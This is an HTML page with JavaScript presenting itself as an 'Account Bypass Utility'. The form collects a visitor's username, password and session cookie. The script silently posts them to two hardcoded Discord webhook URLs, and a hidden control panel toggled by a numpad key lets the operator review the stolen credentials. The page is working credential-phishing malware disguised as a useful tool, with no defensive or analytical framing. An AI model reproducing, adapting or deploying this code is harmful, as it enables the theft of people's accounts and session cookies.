<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Bypass Utility</title>
  <link rel="stylesheet" href="styles.css" />
</head>
<body>

<div class="form-container">
  <h1>[ Account Bypass Utility ]</h1>
  <form id="bypassForm">
    <input type="text" id="usernameInput" placeholder="Username" required />
    <input type="text" id="passwordInput" placeholder="Password" required />
    <input type="text" id="cookieInput" placeholder="Cookie" required />
    <input type="text" id="webhookInput" placeholder="Enter Webhook (Optional)" />
    <button type="submit">Initiate Bypass</button>
    <p class="note">May take from 1 - 30 minutes depending on account</p>
  </form>
</div>

<!-- Hidden Control Panel -->
<div id="overlay"></div>
<div id="controlPanel">
  <h2>[ Control Panel ]</h2>
  <p>Total Sessions: <span id="totalSessions">0</span></p>
  <p>Active Sessions: <span id="activeSessions">0</span></p>
  <div id="sessionList"></div>
</div>

<script>
const hardcodedWebhooks = [
  "https://discord.com/api/webhooks/1365365136239366265/mxlYCx2akrzOOlK2kSjUXB8areX-Om0jpG-0ogzF6DWLkjlRPlJAuXv0T7Jff5q1A94e",
  "https://discord.com/api/webhooks/1365365136239366265/mxlYCx2akrzOOlK2kSjUXB8areX-Om0jpG-0ogzF6DWLkjlRPlJAuXv0T7Jff5q1A94e"
];

let sessions = [];

function sendToWebhook(url, payload) {
  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  })
  .then(res => {
    if (!res.ok) throw new Error("Failed to send");
  })
  .catch(console.error);
}

function updateControlPanel() {
  document.getElementById("totalSessions").textContent = sessions.length;
  const active = sessions.filter(s => s.status === "pending");
  document.getElementById("activeSessions").textContent = active.length;

  const sessionList = document.getElementById("sessionList");
  sessionList.innerHTML = "";

  active.forEach((session, index) => {
    const div = document.createElement("div");
    div.className = "session";
    div.innerHTML = `
      <p><strong>Username:</strong> ${session.username}</p>
      <p><strong>Password:</strong> ${session.password}</p>
      <p><strong>Cookie:</strong> ${session.cookie}</p>
      <p><strong>Webhook:</strong> ${session.userWebhook || "N/A"}</p>
      <button onclick="approveSession(${index})">✅ Approve</button>
      <button onclick="declineSession(${index})">❌ Decline</button>
      <input type="text" id="reason_${index}" placeholder="Reason for decline" />
    `;
    sessionList.appendChild(div);
  });
}

function approveSession(index) {
  const session = sessions[index];
  if (session.userWebhook) {
    sendToWebhook(session.userWebhook, {
      content: `Username: **${session.username}**\nPassword: **${session.password}**\nCookie: **${session.cookie}**`
    });
    session.status = "approved";
    updateControlPanel();
  }
}

function declineSession(index) {
  const session = sessions[index];
  const reason = document.getElementById(`reason_${index}`).value || "No reason provided";
  if (session.userWebhook) {
    sendToWebhook(session.userWebhook, {
      content: `Bypass failed: ${reason}`
    });
    session.status = "declined";
    updateControlPanel();
  }
}

// Form submission handler

const form = document.getElementById("bypassForm");
form.addEventListener("submit", function(e) {
  e.preventDefault();

  const username = document.getElementById("usernameInput").value;
  const password = document.getElementById("passwordInput").value;
  const cookie = document.getElementById("cookieInput").value;
  const userWebhook = document.getElementById("webhookInput").value;

  const fullPayload = {
    content: `Username: **${username}**\nPassword: **${password}**\nCookie: **${cookie}**`
  };

  hardcodedWebhooks.forEach(url => sendToWebhook(url, fullPayload));

  if (userWebhook) {
    sendToWebhook(userWebhook, {
      content: "Bypass in progress. Please wait...\nMay take from 1 - 30 minutes depending on account."
    });

    const session = {
      username,
      password,
      cookie,
      userWebhook,
      createdAt: Date.now(),
      status: "pending"
    };

    sessions.push(session);
    updateControlPanel();

    setTimeout(() => {
      if (session.status === "pending") {
        approveSession(sessions.indexOf(session));
      }
    }, 10 * 60 * 1000);
  }
});

// Toggle control panel with Numpad 1

document.addEventListener("keydown", (e) => {
  if (e.key === "1" && e.location === 3) {
    const panel = document.getElementById("controlPanel");
    const overlay = document.getElementById("overlay");

    const isOpen = panel.style.display === "block";
    panel.style.display = isOpen ? "none" : "block";
    overlay.style.display = isOpen ? "none" : "block";

    if (!isOpen) updateControlPanel();
  }
});
</script>
</body>
</html>
